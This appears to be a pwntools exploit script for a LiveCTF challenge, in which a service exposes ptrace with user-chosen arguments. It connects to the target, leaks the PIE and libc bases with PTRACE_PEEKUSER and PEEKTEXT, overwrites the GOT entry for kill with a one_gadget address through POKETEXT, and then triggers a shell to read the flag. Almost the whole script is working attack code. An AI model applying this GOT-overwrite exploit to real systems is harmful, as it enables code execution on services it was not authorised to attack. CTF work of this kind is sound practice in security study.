#!/usr/bin/env python3

from pwn import *

PTRACE_TRACEME = 0x0
PTRACE_PEEKTEXT = 0x1
PTRACE_PEEKDATA = 0x2
PTRACE_PEEKUSER = 0x3
PTRACE_POKETEXT = 0x4
PTRACE_POKEDATA = 0x5
PTRACE_POKEUSER = 0x6
PTRACE_CONT = 0x7
PTRACE_KILL = 0x8
PTRACE_SINGLESTEP = 0x9
PTRACE_GETREGS = 0xc
PTRACE_SETREGS = 0xd
PTRACE_GETFPREGS = 0xe
PTRACE_SETFPREGS = 0xf
PTRACE_ATTACH = 0x10
PTRACE_DETACH = 0x11
PTRACE_GETFPXREGS = 0x12
PTRACE_SETFPXREGS = 0x13
PTRACE_SYSCALL = 0x18
PTRACE_GET_THREAD_AREA = 0x19
PTRACE_SET_THREAD_AREA = 0x1a
PTRACE_ARCH_PRCTL = 0x1e
PTRACE_SYSEMU = 0x1f
PTRACE_SYSEMU_SINGLESTEP = 0x20
PTRACE_SINGLEBLOCK = 0x21
PTRACE_SETOPTIONS = 0x4200
PTRACE_GETEVENTMSG = 0x4201
PTRACE_GETSIGINFO = 0x4202
PTRACE_SETSIGINFO = 0x4203
PTRACE_GETREGSET = 0x4204
PTRACE_SETREGSET = 0x4205
PTRACE_SEIZE = 0x4206
PTRACE_INTERRUPT = 0x4207
PTRACE_LISTEN = 0x4208
PTRACE_PEEKSIGINFO = 0x4209
PTRACE_GETSIGMASK = 0x420a
PTRACE_SETSIGMASK = 0x420b
PTRACE_SECCOMP_GET_FILTER = 0x420c
PTRACE_SECCOMP_GET_METADATA = 0x420d
PTRACE_GET_SYSCALL_INFO = 0x420e

context.terminal = ['tmux','splitw','-h']
# context.log_level = 'debug'

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

DEBUG = False


if DEBUG:
	con = process('./challenge_patched')
	# gdb.attach(con)
else:
	con = remote(HOST, int(PORT))

def ptrace(req, addr, data, yes=True):
	con.sendlineafter(b'?', hex(req).encode())
	con.sendlineafter(b'?', hex(addr).encode())
	con.sendlineafter(b'?', hex(data).encode())
	con.recvuntil(b'ptrace returned ')
	ret = int(con.recvline(), 16)
	if yes:
		con.sendlineafter(b'?', str(1).encode())
	else:
		con.sendlineafter(b'?', str(0).encode())
	return ret




pie_leak = ptrace(PTRACE_PEEKUSER, 0x8, 0)
# elf = ELF('./challenge')
elf_address = pie_leak + 0x0055727d819000 - 0x55727d81cd68
info("PIE base %s", hex(elf_address))
bss = elf_address + 0x4000 + 0xa00
info("bss %s", hex(bss))

kill_got = elf_address + 0x3fa0

kill_libc = ptrace(PTRACE_PEEKTEXT, kill_got, 0)
info("Kill leak %s", hex(kill_libc))

# if DEBUG:
libc_address = kill_libc + 0x007f2ae3200000 - 0x7f2ae3242750
one_gadget = libc_address + 0xebcf5
system = libc_address + 0x7f6e4d3824c0 - 0x007f6e4d335000

info("Libc base %s", hex(libc_address))
info("One gadget %s", hex(one_gadget))

write_ret = ptrace(PTRACE_POKETEXT, kill_got, one_gadget)
info("Poke ret %s", hex(write_ret))
kill_libc = ptrace(PTRACE_PEEKTEXT, kill_got, 0)
info("Kill leak %s", hex(kill_libc))

detatch = ptrace(PTRACE_DETACH, 0, 0)
info("Detatch %s", hex(detatch))
ptrace(PTRACE_GETREGS, 0x0, bss, yes=False)
con.sendline("./submitter")
flag = con.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)





# detatch = ptrace(PTRACE_DETACH, 0, 0)
# info("Detatch %s", hex(detatch))

con.interactive()